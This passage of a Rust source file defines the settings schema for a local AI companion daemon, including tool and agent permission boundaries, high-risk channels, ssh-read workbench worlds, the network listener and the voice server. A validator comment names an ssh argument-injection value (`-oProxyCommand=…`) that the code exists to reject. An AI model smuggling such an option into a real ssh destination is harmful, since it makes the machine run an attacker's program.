// SPDX-License-Identifier: PolyForm-Noncommercial-1.0.0

//! The settings document.
//!
//! It lives here rather than next to the file handling in `companion-core` because it
//! travels: `get_settings` and `set_settings` put this exact document on the wire, so it is
//! part of the shared vocabulary and not an internal of the daemon. Reading and writing the
//! file stays in `companion_core::settings`, which owns the path, the atomic write and the
//! 0600 mode.
//!
//! The answers of the setup assistant (`DESIGN.md` § Ersteinrichtung) that decide what the
//! daemon *does* live here, one field per point; the ones that only decide what the shell
//! *shows* stay in the shell. The point number is named on every field, so the mapping is
//! traceable in both directions.

use std::collections::BTreeMap;

use schemars::JsonSchema;
use serde::{Deserialize, Serialize};
use thiserror::Error;

use crate::endpoint::EndpointRole;
use crate::endpoint_config::{EndpointConfig, EndpointError, EndpointProfile};
use crate::url::host_of;

/// Version of the settings file format.
pub const SETTINGS_SCHEMA_VERSION: u32 = 1;

/// Id of the generic terminal adapter, the one adapter nobody may end up with by accident.
pub const PTY_ADAPTER_ID: &str = "pty";

/// Longest name the figure may carry. Long enough for a sentence somebody means as a name,
/// short enough that it still fits a menu line.
pub const MAX_FIGURE_NAME_LEN: usize = 64;

/// How far the companion may act on its own with a class of tools.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Default, Serialize, Deserialize, JsonSchema,
)]
#[serde(rename_all = "snake_case")]
pub enum ToolBoundary {
    /// Read, never write.
    ReadOnly,
    /// Ask before every use. The default everywhere.
    #[default]
    Ask,
    /// Act without asking.
    Full,
}

impl ToolBoundary {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::ReadOnly => "read_only",
            Self::Ask => "ask",
            Self::Full => "full",
        }
    }
}

/// The three tool classes that reach outside the machine. `DESIGN.md` § Sicherheit puts
/// them on `ask` and lets only the person raise them, with a warning.
///
/// No tool of `companion-brain` sends mail, pushes to a phone or publishes anything yet
/// (2026-09-03) — these three fields travel with the settings document and the shell can
/// show and raise them, but nothing reads them: they take effect only once the matching
/// tool exists. The guard against a future tool of one of these classes shipping without
/// also reading its field is a test over
/// `companion_brain::tools::ToolBox::ungated_high_risk_specs`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
pub struct HighRiskSettings {
    /// No effect until a mail tool exists — see the struct doc above.
    pub mail: ToolBoundary,
    /// No effect until a push tool exists — see the struct doc above.
    pub push: ToolBoundary,
    /// No effect until a publish tool exists — see the struct doc above.
    pub publish: ToolBoundary,
}

impl Default for HighRiskSettings {
    fn default() -> Self {
        Self {
            mail: ToolBoundary::Ask,
            push: ToolBoundary::Ask,
            publish: ToolBoundary::Ask,
        }
    }
}

/// Where the companion may reach a person. `DESIGN.md` § Ersteinrichtung, point 12.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize, JsonSchema,
)]
#[serde(rename_all = "snake_case")]
pub enum NotificationChannel {
    /// The character on the screen. The only channel that never leaves the machine, and
    /// therefore the only one that is on by default.
    Figure,
    /// A short sound next to the figure.
    Sound,
    /// Said out loud, over the configured speech output.
    Speech,
    /// A notification of the operating system, seen even when the figure is covered.
    SystemNotification,
    /// A push message to a phone.
    Push,
    /// An email.
    Mail,
}

impl NotificationChannel {
    /// Whether reaching somebody this way sends something off this machine.
    pub fn leaves_the_machine(self) -> bool {
        matches!(self, Self::Push | Self::Mail)
    }
}

/// How far the companion acts on its own when a session reports something.
/// `DESIGN.md` § Ersteinrichtung, point 3.
#[derive(
    Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Default, Serialize, Deserialize, JsonSchema,
)]
#[serde(rename_all = "snake_case")]
pub enum Autonomy {
    /// Watch and report, decide nothing. The default.
    #[default]
    Observe,
    /// Answer what is unambiguous, ask about the rest.
    Ask,
    /// Answer and act within the guardrails of the job file.
    Act,
}

/// How much of the skill package goes into a recognised harness.
/// `DESIGN.md` § Ersteinrichtung, point 10.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum SkillLevel {
    /// Nothing is installed.
    None,
    /// The obligatory core.
    #[default]
    Recommended,
    /// The core and the checked extensions.
    Many,
    All,
}

/// What happens when a session reports that it is done.
/// `DESIGN.md` § Ersteinrichtung, point 11.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum DoneHandling {
    /// The person is told, and nothing else happens. The sparing default.
    #[default]
    Forward,
    /// The gate commands of the job file run, and their verdict is reported with it.
    Gate,
    /// A second session reviews the result before the person sees it.
    Reviewer,
}

/// How much the companion says. `DESIGN.md` § Ersteinrichtung, point 8.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum ConversationStyle {
    #[default]
    Terse,
    Detailed,
}

/// How the companion addresses the person. `DESIGN.md` § Ersteinrichtung, point 8.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum AddressForm {
    /// German "du", English first name.
    #[default]
    Informal,
    Formal,
}

/// Which speech path one connected agent uses.
///
/// `DESIGN.md` § Session-Adapter, addendum of 2026-08-24: an agent that brings its own
/// speech may keep it, and the companion then passes text and control through without
/// listening or speaking for that agent. An agent without speech of its own gets the
/// companion's pipeline in front of it, which is why that is the default here.
///
/// This is an ordinary setting, deliberately not a high-risk one: both paths speak on the
/// same machine to the same person, and neither widens what runs unasked. It therefore
/// stays out of [`Settings::high_risk_changes`].
///
/// **Nothing acts on this yet (2026-08-24).** The value is stored, checked, carried over
/// the socket and read back by the shell, but no part of the voice pipeline asks for it:
/// `passthrough` today leaves the companion's microphone and voice exactly where
/// `companion` leaves them. The wiring belongs to the voice integration. Until it lands,
/// somebody who sets `passthrough` and still hears the companion is not looking at a bug
/// in this field.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default, Serialize, Deserialize, JsonSchema)]
#[serde(rename_all = "snake_case")]
pub enum VoicePath {
    /// The companion's own speech pipeline runs in front of the agent: it listens for the
    /// person, hands the agent text, and says the agent's answers itself. The default,
    /// because an agent that cannot speak is left mute by any other choice.
    #[default]
    Companion,
    /// The agent keeps its own speech. The companion passes text and control through and
    /// keeps its own microphone and voice out of this agent's way, so the two never talk
    /// over each other.
    Passthrough,
}

impl VoicePath {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Companion => "companion",
            Self::Passthrough => "passthrough",
        }
    }
}

/// What the companion watches for on its own, and where each of the four thresholds sits.
///
/// `DESIGN.md` § Ausbau, "Volle Proaktivität": "Session hängt auffällig lange, Budget wird
/// eng, ein Termin rückt heran, der Morgen-Überblick beim ersten Erscheinen. Jede Meldeklasse
/// ist einzeln abschaltbar."
///
/// All four are on at the factory, unlike every other switch of this document that decides
/// what the companion may do by itself. Watching and saying so is the *bottom* rung of
/// § Verhalten, "Eigene Autonomie" — the rung [`Autonomy::Observe`] is named after — so a
/// person who never touched a setting has a companion that reports, which is what they
/// installed it for. Nothing here acts: the four notices are sentences, and the only thing
/// they cost is the person's attention, which is what the thresholds are for.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(default)]
pub struct ProactiveSettings {
    /// A session busy without a sign of life for longer than
    /// [`Self::stalled_after_minutes`].
    pub session_stalled: bool,
    /// The subscription budget past [`Self::budget_percent`].
    pub budget_tight: bool,
    /// An appointment starting within [`Self::appointment_lead_minutes`]. Silent without the
    /// calendar permission, and it never asks for one of its own accord: a dialog nobody
    /// opened is exactly the unasked interruption this whole section is careful about.
    pub appointment_soon: bool,
    /// The overview at the first appearance of the day.
    pub morning_briefing: bool,
    /// How long a session may be busy without any sign of life before it counts as stuck.
    ///
    /// Twenty minutes because a long tool step, a big test suite and a model that is thinking
    /// all look exactly like a hung session from the outside for several minutes at a time;
    /// under that, the notice would be about the companion's impatience rather than about the
    /// session. Zero switches the class off the same way [`Self::session_stalled`] does — a
    /// threshold of nothing would make every busy session stuck.
    pub stalled_after_minutes: u32,
    /// Share of the budget, in per cent, past which the companion says so. Zero switches the
    /// class off, for the same reason as above.
    ///
    /// Not [`Settings::budget_limit_percent`], which is the share at which the companion
    /// stops *starting* things: a person may well want to hear about it long before anything
    /// is refused, and hearing about it at the moment work stops is too late to plan around.
    pub budget_percent: u8,
    /// How many minutes before an appointment the notice comes. Zero switches the class off.
    pub appointment_lead_minutes: u32,
    /// Whether one line goes into the conversation when a session needs the person: it has
    /// asked something, it waits for input, or a permission was refused for it.
    ///
    /// Off at the factory, unlike the four classes above, and the only one of these values
    /// that writes into the chat history at all. `DESIGN.md` § Chat-Hygiene, 2026-09-05: the
    /// history is the conversation, and what a session reports about itself belongs in the
    /// notice log — "es sei denn, der Mensch hat `report_sessions_needing_me` eingeschaltet,
    /// dann genau eine Zeile je Anlass". He says when he wants it; until he does, the figure
    /// and the session list carry the news on their own.
    pub report_sessions_needing_me: bool,
    /// Whether the companion addresses a workbench task that needs the person — it asks
    /// something, it waits for acceptance, or its lead agent gave it up — with a tone, a
    /// banner and a spoken sentence (`ProactiveClass::TaskEvent`).
    ///
    /// Off at the factory, and only the person switches it: "Ob der Companion eine Aufgabe,
    /// die ihn braucht, von sich aus anspricht, hängt an seinem Schalter, der ab Werk aus ist
    /// und den nur Skryx-L-A stellt" (`claude-workbench/docs/AGENTS-PLAN.md` § 6). Off does not
    /// hide a task: every event of one still goes into the notice log and to the figure, and
    /// the session list and the morning overview carry where each task stands.
    pub task_events: bool,
    /// Whether the companion addresses what a workbench world needs from the person — an
    /// open question of its lead agent, a message an agent marked as a question or a result
    /// for the person — with a tone, a banner and a spoken sentence
    /// (`ProactiveClass::WorldEvent`).
    ///
    /// Off at the factory, for the reason [`Self::task_events`] is: the plan makes the
    /// companion the way these reach the person (`claude-workbench/docs/AGENTS-PLAN.md` § 7),
    /// and whether that way makes a sound is the person's switch. Off does not hide
    /// anything: every such item still goes into the notice log and to the figure, the
    /// morning overview counts them, and the companion reads them out when asked.
    pub world_events: bool,
}

impl Default for ProactiveSettings {
    fn default() -> Self {
        Self {
            session_stalled: true,
            budget_tight: true,
            appointment_soon: true,
            morning_briefing: true,
            stalled_after_minutes: 20,
            budget_percent: 85,
            appointment_lead_minutes: 15,
            report_sessions_needing_me: false,
            task_events: false,
            world_events: false,
        }
    }
}

impl ProactiveSettings {
    /// Whether the class is switched on *and* has a threshold that can ever be crossed.
    /// A class whose threshold is zero is off however its switch stands — see the field docs.
    pub fn watches(&self, class: crate::ProactiveClass) -> bool {
        match class {
            crate::ProactiveClass::SessionStalled => {
                self.session_stalled && self.stalled_after_minutes > 0
            }
            crate::ProactiveClass::BudgetTight => self.budget_tight && self.budget_percent > 0,
            crate::ProactiveClass::AppointmentSoon => {
                self.appointment_soon && self.appointment_lead_minutes > 0
            }
            crate::ProactiveClass::MorningBriefing => self.morning_briefing,
            // Not one of the observer's classes and not switchable here: whether a finished
            // run is checked and reported at all is `done_handling`, and by the time the
            // report exists there is nothing left to suppress. See
            // [`crate::ProactiveClass::SessionReport`].
            crate::ProactiveClass::SessionReport => true,
            // Whether a task that needs the person is *addressed*. The line in the log and
            // the bubble at the figure come either way — see [`Self::task_events`].
            crate::ProactiveClass::TaskEvent => self.task_events,
            // The same split for what a workbench world needs from the person — see
            // [`Self::world_events`].
            crate::ProactiveClass::WorldEvent => self.world_events,
        }
    }
}

/// The name a [`WorldSource`] gives this machine: the worlds there are read by starting the
/// workbench's programs here. The workbench writes the same word for the same thing
/// (`wb-welt neu --maschine lokal`).
pub const LOCAL_WORLD_MACHINE: &str = "lokal";

/// The shortest interval the daemon reads the worlds at. Each pass starts one `wb-welt`
/// process per world, over ssh for a remote machine; under this the reading itself would be
/// the load, and nothing in a world moves faster than an agent's turn does.
pub const MIN_WORLD_POLL_SECONDS: u32 = 15;

/// Where the agent worlds of the workbench are read from (`claude-workbench/docs/AGENTS-PLAN.md`
/// § 7: the companion is the way "braucht dich" reaches the person, and a player in the
/// world's channel).
///
/// Read only through the workbench's own programs — `wb-welt finden`, `wb-welt ansicht`,
/// `wb-kanal`, `wb-ticket` — and never by opening a world's files: the world has one writer,
/// its data library, and a reader that bypassed it would see half-written transactions the
/// library's own view hides.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(default)]
pub struct WorldsSettings {
    /// Whether the daemon reads worlds at all. On at the factory: it only reads, a machine
    /// without the workbench's programs simply has no worlds, and the companion being the
    /// way a world's question reaches the person is the plan, not an extra.
    pub enabled: bool,
    /// How often the worlds are read, in seconds. At least [`MIN_WORLD_POLL_SECONDS`].
    pub poll_seconds: u32,
    /// The machines whose worlds are read. This machine alone at the factory.
    pub sources: Vec<WorldSource>,
}

impl Default for WorldsSettings {
    fn default() -> Self {
        Self {
            enabled: true,
            poll_seconds: 60,
            sources: vec![WorldSource::default()],
        }
    }
}

/// One machine whose worlds the companion reads, and how to ask it.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(default)]
pub struct WorldSource {
    /// [`LOCAL_WORLD_MACHINE`] for this machine, otherwise the ssh destination the
    /// workbench's programs run on (`peer`, `ich@peer`). The companion uses the ssh this
    /// account already has, with its keys and its configuration; it adds no transport of
    /// its own.
    pub machine: String,
    /// The directory holding `wb-welt`, `wb-kanal`, `wb-ticket` and `agents_traeger.py`, on
    /// that machine. Empty looks them up on the `PATH`. A leading `~/` is that machine's
    /// home directory.
    pub cli_dir: String,
    /// Directories whose subfolders are searched for a project world (`wb-welt finden
    /// --wurzel`). Empty together with [`Self::projects`] leaves the workbench's own
    /// default, `~/AI`.
    pub roots: Vec<String>,
    /// Project directories checked directly (`--projekt`).
    pub projects: Vec<String>,
    /// The global world (`--global`). Empty leaves the workbench's own default.
    pub global: String,
    /// Skip the global world entirely (`--ohne-global`).
    pub without_global: bool,
}

impl Default for WorldSource {
    fn default() -> Self {
        Self {
            machine: LOCAL_WORLD_MACHINE.to_owned(),
            cli_dir: String::new(),
            roots: Vec::new(),
            projects: Vec::new(),
            global: String::new(),
            without_global: false,
        }
    }
}

impl WorldSource {
    /// Whether this source is this machine.
    pub fn is_local(&self) -> bool {
        self.machine.trim() == LOCAL_WORLD_MACHINE
    }
}

/// Whether a machine name can go to `ssh` as its destination and nothing else.
///
/// Letters, digits, dot, underscore, hyphen and one `@` between user and host, never a
/// leading hyphen: a destination that starts with `-` is an option to `ssh`, and
/// `-oProxyCommand=…` would be a program this machine starts.
pub fn is_ssh_destination(machine: &str) -> bool {
    let valid_part = |part: &str| {
        !part.is_empty()
            && !part.starts_with('-')
            && part
                .chars()
                .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-'))
    };
    if machine.len() > 255 {
        return false;
    }
    match machine.split_once('@') {
        Some((user, host)) => valid_part(user) && valid_part(host),
        None => valid_part(machine),
    }
}

/// Where a coordinate for the weather and places tools comes from, when a call does not name
/// a place of its own. `DESIGN.md` § Ausbau, "Werkzeugkatalog": "Standort kommt aus der
/// macOS-Ortung … wenn freigegeben", with manual coordinates as the alternative it names
/// first — "Ort/Koordinaten in Settings".
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(default)]
pub struct LocationSettings {
    /// Off unless a person turned it on. `DESIGN.md` § Ausbau: "Ortung ist eine eigene,
    /// standardmäßig AUS-Einstellung." Even switched on, this only allows the daemon to ask
    /// the operating system for a position at all — the system's own dialog, not this flag,
    /// decides whether it actually gets one.
    pub allow_system_location: bool,
    /// A place name, shown back to the person; carries no meaning for the tools themselves,
    /// which read only the coordinates below.
    pub place_name: String,
    pub latitude: Option<f64>,
    pub longitude: Option<f64>,
}

impl LocationSettings {
    /// The manual coordinate, when both halves of the pair are set. A place name alone is
    /// not enough for a weather lookup — it still needs a coordinate, and geocoding one from
    /// a name on every chat turn would be the places tool's network call happening a second
    /// time for no reason.
    pub fn manual_coordinates(&self) -> Option<(f64, f64)> {
        match (self.latitude, self.longitude) {
            (Some(latitude), Some(longitude)) => Some((latitude, longitude)),
            _ => None,
        }
    }
}

/// Port the network listener uses when nobody says otherwise.
///
/// High enough to need no privileges, and not one anything else in reach claims.
pub const DEFAULT_NETWORK_PORT: u16 = 47801;

/// Address the network listener binds when nobody says otherwise.
///
/// Loopback, which is useless for a phone and harmless for everybody else. A person who
/// wants the phone to reach the daemon writes the tailnet address of this machine here —
/// `DESIGN.md` § Mobil, Ferntransport builds the VPN way first, and an address that is only
/// reachable inside the tailnet is the smaller step than binding every interface.
pub const DEFAULT_NETWORK_BIND: &str = "127.0.0.1";

/// The TCP/TLS listener a phone reaches the daemon through.
///
/// `DESIGN.md` § Mobil, Ferntransport: off at the factory, and switching it on is a
/// high-risk setting — at the network port the UID check of the Unix socket falls away, and
/// what is left is the certificate and the token. The role `agent` does not exist there at
/// all; a remote orchestrator keeps reporting to the daemon on its own machine.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(default)]
pub struct NetworkSettings {
    /// Off unless a person turned it on, with the warning in front of them.
    pub enabled: bool,
    /// The address to bind. See [`DEFAULT_NETWORK_BIND`].
    pub bind_address: String,
    pub port: u16,
    /// The address a pairing tells a device to connect to, when that is not the address
    /// the daemon binds. Empty means they are the same.
    ///
    /// A wildcard bind says which interfaces the daemon accepts on, not where anybody can
    /// reach it, and a daemon behind a forwarded port or a dynamic name is reached under
    /// something it never sees. Both cases put the reachable address here.
    pub advertise_address: String,
}

impl Default for NetworkSettings {
    fn default() -> Self {
        Self {
            enabled: false,
            bind_address: DEFAULT_NETWORK_BIND.to_owned(),
            port: DEFAULT_NETWORK_PORT,
            advertise_address: String::new(),
        }
    }
}

/// The local speech server the daemon starts when it needs one.
///
/// `DESIGN.md` § Voice puts the speech models behind endpoint profiles, and the local ones
/// live in a server that has to be running before the first word. Expecting somebody to
/// have started it is what made the voice path fail with "connection refused" instead of
/// speaking; expecting the daemon to keep it running all day would hold a model in memory
/// for the twenty-three hours nobody talks.
///
/// So: started at the first voice request, waited for, and stopped again after a
/// configurable idle. Off at the factory, because starting a program named in a file is
/// something a person decides — the same reasoning as for the terminal adapter, and the
/// same warning when it is switched on.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[serde(default)]
pub struct VoiceServerSettings {
    /// Off unless a person turned it on, with the warning in front of them.
    pub enabled: bool,
    /// Program and arguments, program first. There is no default program: which server
    /// serves the local models is a choice, and guessing one would start something nobody
    /// asked for.
    pub command: Vec<String>,
    /// Environment variables for it, on top of the daemon's own.
    ///
    /// `HF_HUB_OFFLINE=1` is set by the daemon whatever stands here: a speech server that
    /// reaches for a model download on the first request turns a spoken sentence into a
    /// network call nobody asked for. Naming it here anyway is allowed and changes nothing.
    pub env: BTreeMap<String, String>,
    /// The URL the daemon asks until the server answers, for example
    /// `http://127.0.0.1:8765/v1/models`. Any answer counts as ready, including an error
    /// status: what is being established is that the server is listening and serving, not
    /// that this particular route exists.
    pub ready_url: String,
    /// How long the daemon waits for it to answer before it gives up and says so. Loading a
    /// speech model takes seconds to tens of seconds, so this is generous by default.
    pub startup_timeout_seconds: u64,
    /// How long without a voice request before the server is stopped again. Zero keeps it
    /// running for as long as the daemon does.
    pub idle_timeout_seconds: u64,
}

impl Default for VoiceServerSettings {
    fn default() -> Self {
        Self {
            enabled: false,
            command: Vec::new(),
            env: BTreeMap::new(),
            ready_url: String::new(),
            startup_timeout_seconds: 120,
            idle_timeout_seconds: 300,
        }
    }
}

/// Whether a url speaks http and points at this machine.
///
/// The readiness question is asked about a program this daemon started here, so an address
/// somewhere else can only give a wrong answer: a server on another machine would prove that
/// a local one is running. Checked by hand rather than with a url parser, because this is the
/// whole question — a scheme and a host — and pulling a parser in for it would be a
/// dependency for two `strip_prefix` calls.
pub fn is_loopback_url(url: &str) -> bool {
    let rest = match url.strip_prefix("http://") {
        Some(rest) => rest,
        None => match url.strip_prefix("https://") {
            Some(rest) => rest,
            None => return false,
        },
    };
    let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
    // The userinfo of a url is not a host, and a host that hides behind one is not local.
    if authority.contains('@') {
        return false;
    }
    let host = match authority.strip_prefix('[') {
        // An IPv6 literal in brackets; the port comes after the closing one.
        Some(rest) => match rest.split_once(']') {
            Some((host, _)) => host,
            None => return false,
        },
        None => authority.split(':').next().unwrap_or(""),
    };
    host == "localhost" || host == "::1" || host.starts_with("127.")
}

/// Whether talking to this endpoint sends what it is given off this machine.
///
/// `DESIGN.md` § Voice makes a cloud endpoint for STT or S2S a high-risk setting, "weil Audio
/// die Maschine verlässt", so something has to decide what "cloud" means. Three things stay
/// on the machine: a [`EndpointProtocol::Cli`] profile, which is a local program; a unix
/// socket; and an http address that [`is_loopback_url`] calls local. Everything else counts
/// as leaving, including an address on the home network — a machine in the next room is
/// still not this one, and audio that goes there went somewhere.
pub fn endpoint_leaves_the_machine(profile: &EndpointProfile) -> bool {
    if profile.protocol.is_cli() {
        return false;
    }
    let url = profile.url.trim();
    if url.starts_with("unix:") || url.starts_with('/') {
        return false;
    }
    !is_loopback_url(url)
}

/// How far a bind address lets the daemon be reached.
///
/// Only the order matters, which is why this is three steps and not a list of addresses:
/// going up a step is what a person has to confirm (`DESIGN.md` § Mobil, the network port
/// is a high-risk setting). A move between two addresses of the same reach — one tailnet
/// address for another — is not a widening and is not treated as one.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Reach {
    /// Only this machine can reach it.
    Loopback,
    /// One named interface, reachable by whoever is on that network.
    OneInterface,
    /// Every interface there is.
    Everything,
}

/// How far an address lets the daemon be reached.
///
/// An address this build cannot parse counts as [`Reach::Everything`]: something the daemon
/// does not understand is not something it may call narrow.
pub fn reach_of(address: &str) -> Reach {
    let address = address.trim();
    let address = address
        .strip_prefix('[')
        .and_then(|rest| rest.strip_suffix(']'))
        .unwrap_or(address);
    if address.is_empty() {
        return Reach::Everything;
    }
    match address.parse::<std::net::IpAddr>() {
        Ok(parsed) if parsed.is_loopback() => Reach::Loopback,
        Ok(parsed) if parsed.is_unspecified() => Reach::Everything,
        Ok(_) => Reach::OneInterface,
        // A host name rather than an address. What it resolves to is not this build's to
        // decide, so it counts as the widest of the three.
        Err(_) => Reach::Everything,
    }
}

impl NetworkSettings {
    /// How far this address lets the daemon be reached.
    pub fn reach(&self) -> Reach {
        reach_of(&self.bind_address)
    }

    /// What the listener binds, `address:port`.
    pub fn socket_address(&self) -> String {
        // An IPv6 literal needs its brackets, and a person who typed one should not have to
        // know that the daemon glues the two halves together with a colon.
        if self.bind_address.contains(':') && !self.bind_address.starts_with('[') {
            format!("[{}]:{}", self.bind_address, self.port)
        } else {
            format!("{}:{}", self.bind_address, self.port)
        }
    }
}

/// Whether an adapter is loaded when the settings say nothing about it.
///
/// Most are: an empty `enabled_adapters` means "everything this build has". An opt-in one
/// is not, and that is a security decision rather than a taste one — `DESIGN.md`
/// § Sicherheit points out that a permission level has no hold over a foreign CLI, so the
/// adapter that runs foreign CLIs has to be asked for by name.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AdapterDefault {
    /// Loaded unless the settings name other adapters instead.
    On,
    /// Loaded only when the settings name it.
    OptIn,
}

/// Everything the daemon reads out of its settings file.
///
/// `PartialEq` only, not `Eq`: [`LocationSettings`] carries an `f64` coordinate, and `f64`
/// has no total order to found an `Eq` on.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, JsonSchema)]
#[serde(default)]
pub struct Settings {
    pub schema_version: u32,
    /// Boundary for the companion's own tools, everything that is not high risk.
    /// `DESIGN.md` § Ersteinrichtung, point 13.
    pub tool_boundary: ToolBoundary,
    /// Boundary a spawned session runs under. `DESIGN.md` § Ersteinrichtung, point 2.
    ///
    /// A second field rather than the same one, because the two are different questions:
    /// what the companion may do itself, and what it may let an agent do.
    pub agent_boundary: ToolBoundary,
    pub high_risk: HighRiskSettings,
    /// Adapters the daemon should load. Empty means every adapter it was built with,
    /// with one exception: an adapter that is opt-in stays off until it is named here by
    /// its id. The generic terminal adapter ([`PTY_ADAPTER_ID`]) is the one, because
    /// `DESIGN.md` § Sicherheit says a permission level cannot restrict a foreign CLI —
    /// nobody is to end up with one by accident.
    pub enabled_adapters: Vec<String>,
    /// The command the generic terminal adapter runs, program first, arguments after.
    /// Empty is the default and means it starts nothing: there is no sensible default
    /// program for "any CLI".
    pub pty_command: Vec<String>,
    /// The speech path per connected agent, keyed by adapter id.
    ///
    /// An adapter that is not named here uses [`VoicePath::Companion`], so a newly
    /// connected harness is never silently left mute — see [`Settings::voice_path`].
    /// `DESIGN.md` § Session-Adapter, addendum of 2026-08-24.
    ///
    /// As of 2026-08-24 the value has no effect anywhere; see [`VoicePath`].
    pub adapter_voice: BTreeMap<String, VoicePath>,
    /// Where the person is told about something. The figure alone by default: every other
    /// channel either makes noise or leaves the machine.
    /// `DESIGN.md` § Ersteinrichtung, point 12.
    pub notification_channels: Vec<NotificationChannel>,
    /// Whether a finished session is worth telling the person about. On by default, because
    /// a run that is done is the one thing somebody is actually waiting for.
    pub forward_done: bool,
    /// What happens with a finished run beyond telling the person.
    /// `DESIGN.md` § Ersteinrichtung, point 11. [`Self::forward_done`] says whether the
    /// person hears about it at all, this says what else runs.
    pub done_handling: DoneHandling,
    pub autonomy: Autonomy,
    /// Whether the companion may read what is installed — skills, tools, MCP servers,
    /// workflows. `DESIGN.md` § Ersteinrichtung, point 4, and § Sicherheit: reading a
    /// working directory is reading somebody's work, so it stays off until it is allowed.
    pub inventory_allowed: bool,
    /// Share of the budget at which the companion stops starting anything new, in per cent.
    /// Zero means no limit. `DESIGN.md` § Ersteinrichtung, point 7.
    pub budget_limit_percent: u8,
    /// `DESIGN.md` § Ersteinrichtung, point 10.
    pub skill_level: SkillLevel,
    /// The tier last applied successfully after a human choice. An older document has no
    /// marker, so the default `recommended` never installs merely because the daemon started.
    /// Managed by the daemon after installation, not trusted from the wire.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub selected_skill_level: Option<SkillLevel>,
    /// `DESIGN.md` § Ersteinrichtung, point 8: how much he says.
    pub conversation_style: ConversationStyle,
    /// `DESIGN.md` § Ersteinrichtung, point 8: how he addresses the person.
    pub address_form: AddressForm,
    /// `DESIGN.md` § Ersteinrichtung, point 8: what the figure is called. The companion
    /// writes in this name, which is why it is the daemon's and not only the window's.
    pub figure_name: String,
    /// Whether the figure has already introduced itself by name.
    ///
    /// `DESIGN.md` § Ausbau, "Name und Persona": the figure introduces itself with the name
    /// somebody gave it — once, at its first appearance after the setup, and never again
    /// unasked. The mark belongs here rather than in the preferences of a shell, for the
    /// reason `TASKS.md` "Erststart" already wrote down about the setup itself: a mark that
    /// only the shell holds survives a wiped configuration directory, and a freshly set up
    /// figure would then never say hello. A shell sets this the moment it has said it.
    #[serde(default)]
    pub introduced: bool,
    /// The provider profiles and which role uses which of them. Keys live in the keychain;
    /// a profile here holds only the name of one.
    /// `DESIGN.md` § Ersteinrichtung, point 9.
    #[schemars(default = "EndpointConfig::empty")]
    pub endpoints: EndpointConfig,
    /// The network listener a phone connects through. Off at the factory.
    /// `DESIGN.md` § Mobil, Ferntransport.
    pub network: NetworkSettings,
    /// The local speech server the daemon starts on demand. Off at the factory.
    pub voice_server: VoiceServerSettings,
    /// Where the `weather` and `places` tools take "here" from, when a call does not name a
    /// place of its own. `DESIGN.md` § Ausbau, "Werkzeugkatalog".
    pub location: LocationSettings,
    /// Whether the `weather` tool may run at all. `DESIGN.md` § Werkzeugkatalog: every
    /// network tool is "einzeln abschaltbar". On by default — Open-Meteo needs no key and
    /// the tool answers only what the person's own location setting already names.
    pub weather_enabled: bool,
    /// Whether the `places` tool (geocoding and routes) may run at all. Same reasoning as
    /// [`Self::weather_enabled`].
    pub places_enabled: bool,
    /// Whether the `web_research` tool may run at all — the one tool that asks the open
    /// internet a question in the person's own words rather than sending a coordinate.
    /// Same reasoning as [`Self::weather_enabled`], and on by default for the same one:
    /// it needs no key of its own, it runs through whichever subagent the person has
    /// already configured, and `tool_boundary = read_only` switches it off along with the
    /// other two outward tools regardless of what stands here.
    pub web_research_enabled: bool,
    /// What the companion watches for on its own, and where each threshold sits.
    /// `DESIGN.md` § Ausbau, "Volle Proaktivität". All four classes on at the factory —
    /// see [`ProactiveSettings`] for why this one defaults to on where the rest default off.
    pub proactive: ProactiveSettings,
    /// Whether a tool step classified `slow` has its already-gated local result condensed
    /// through a subagent. `DESIGN.md` § Wechselspiel und Ansprechbarkeit names this class
    /// of tool by an expectation, not a measured duration — there is no clock behind this
    /// switch either, which is why it reads as on/off rather than as a number of seconds:
    /// a duration here would promise a precision this program does not have. Off means
    /// every tool step runs in the daemon itself, whatever its class, which stays a
    /// background task either way and never blocks the chat.
    pub subagent_condensation_enabled: bool,
    /// Where the workbench's agent worlds are read from. See [`WorldsSettings`].
    pub worlds: WorldsSettings,
}

/// The name the figure carries until somebody renames it.
pub const DEFAULT_FIGURE_NAME: &str = "Companion";

impl Default for Settings {
    fn default() -> Self {
        Self {
            schema_version: SETTINGS_SCHEMA_VERSION,
            tool_boundary: ToolBoundary::Ask,
            agent_boundary: ToolBoundary::Ask,
            high_risk: HighRiskSettings::default(),
            enabled_adapters: Vec::new(),
            pty_command: Vec::new(),
            adapter_voice: BTreeMap::new(),
            notification_channels: vec![NotificationChannel::Figure],
            forward_done: true,
            done_handling: DoneHandling::default(),
            autonomy: Autonomy::Observe,
            inventory_allowed: false,
            budget_limit_percent: 0,
            skill_level: SkillLevel::default(),
            selected_skill_level: None,
